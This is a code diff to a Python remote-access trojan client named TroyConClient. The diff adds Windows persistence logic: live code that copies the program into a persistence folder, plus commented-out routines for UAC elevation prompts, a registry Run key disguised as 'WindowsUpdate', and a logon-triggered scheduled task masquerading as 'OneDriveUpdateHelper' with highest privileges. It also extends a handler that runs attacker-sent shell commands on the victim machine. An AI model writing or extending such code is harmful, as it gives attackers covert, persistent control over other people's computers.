@@ -1,6 +1,7 @@
 import os
 import sys
 import socket
+# import shutil
 import subprocess
 import threading
 import time
@@ -128,10 +129,33 @@ class TroyConClient:
         if os.name == 'nt':
             try:
                 current_exe_path = os.path.abspath(sys.argv[0])
-               # Fix the destination path for the copied file within the current Persistence directory (persistence_dir)
+                
+                # current_exe_dir = os.path.dirname(current_exe_path)
+                # folder_name = os.path.basename(current_exe_dir)
+
+                # Fix the destination path for the copied file within the current Persistence directory (persistence_dir)
+                # program_files = os.environ.get("ProgramFiles", r"C:\Program Files")
+                # dest_dir = os.path.join(program_files, folder_name)
+                
                 persistence_target_path = os.path.join(self.persistence_dir, 'troycon.py') # Don't use after converting to an EXE file.
 
+                # if not os.path.exists(dest_dir):
+                #     try:
+                #         is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+                #     except:
+                #         is_admin = False
+
+                #     if not is_admin:
+                #         params = " ".join([f'"{arg}"' for arg in sys.argv])
+                #         ctypes.windll.shell32.ShellExecuteW(
+                #             None, "runas", sys.executable, params, None, 1)
+                #         sys.exit()
+                #     shutil.copytree(current_exe_dir, dest_dir)
+
                 if not os.path.exists(persistence_target_path):
+                    # if current_exe_path != persistence_target_path:
+                    #     shutil.copy2(current_exe_path, persistence_target_path)
+                    #     print(f"[Persistence] Copied to '{persistence_target_path}' (Timestamp preserved).")
                     with open(current_exe_path, 'rb') as src_file, \
                         open(persistence_target_path, 'wb') as dst_file:
                         dst_file.write(src_file.read())
@@ -139,12 +163,39 @@ class TroyConClient:
                 else:
                     print(f"[Persistence] File '{persistence_target_path}' already exists. Skipping copy.")
 
+
+                # if you want to find the .exe file in the copied folder, uncomment below
+                # exe_path = None
+
+                # for root, dirs, files in os.walk(dest_dir):
+                #     for file in files:
+                #         if file.lower().endswith(".exe"):
+                #             exe_path = os.path.join(root, file)
+                #             break
+                #     if exe_path:
+                #         break
+
+                # if not exe_path:
+                #     print("[Error] Could not find any executable (.exe) files in the copied folder.")
+                #     return False
+
                 # Register in the Registry Run key
                 # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                 # key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                 # key_handle = CreateKey(HKEY_CURRENT_USER, key_path)
                 # SetValueEx(key_handle, "WindowsUpdate", 0, REG_SZ, persistence_target_path)
                 # print("Registry Run key registration complete")
+
+                # Register to Task Scheduler
+                # Task Name: "OneDriveUpdateHelper" (Masquerading as a legitimate service)
+                # Trigger: /sc onlogon (Runs every time the user logs in)
+                # Force: /f (Overwrite if exists)
+                # task_name = "OneDriveUpdateHelper"
+                # cmd = f'schtasks /create /tn "{task_name}" /tr "{persistence_target_path}" /sc onlogon /rl HIGHEST /f'
+                
+                # Execute command in the background without a console window
+                # subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                # print(f"[Persistence] Registered to Task Scheduler as '{task_name}'.")
 
             except Exception as e:
                 print(f"[Error] Final persistence setup failed: {e}")
@@ -191,6 +242,20 @@ class TroyConClient:
         :param cmd: Command string
         :return: stdout + stderr (bytes)
         """
+
+        if cmd.strip().lower().startswith('cd'):
+            try:
+                target = cmd.strip()[2:].strip()
+                new_dir = os.path.abspath(os.path.join(self.test_dir, target))
+                
+                if os.path.exists(new_dir) and os.path.isdir(new_dir):
+                    self.test_dir = new_dir 
+                    return f"[Success] Changed directory to: {self.test_dir}".encode('utf-8')
+                else:
+                    return f"[Error] Directory not found: {new_dir}".encode('utf-8')
+            except Exception as e:
+                return f"[Error] {e}".encode('utf-8')
+            
         try:
             # Execute command using subprocess (capture stdout and stderr)
             proc = subprocess.Popen(cmd, shell=True,
